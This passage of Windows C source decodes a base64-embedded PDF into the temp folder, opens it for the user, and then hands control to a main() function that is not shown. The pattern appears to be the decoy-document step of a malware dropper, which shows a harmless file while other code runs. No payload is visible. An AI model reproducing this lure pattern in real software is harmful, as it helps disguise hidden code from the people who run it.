        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        HeapFree(GetProcessHeap(), 0, buffer);
        return FALSE;
    }

    DWORD written = 0;
    WriteFile(hFile, buffer, needed, &written, NULL);

    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, buffer);

    return TRUE;
}
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd)
{
    wchar_t path[MAX_PATH];
    GetTempPathW(MAX_PATH, path);
    wcscat_s(path, MAX_PATH, L"document.pdf");

    if (SaveBase64ToPdf(pdf_base64, path))
    {
        ShellExecuteW(NULL, L"open", path, NULL, NULL, SW_SHOW);
    }
    return main();
}
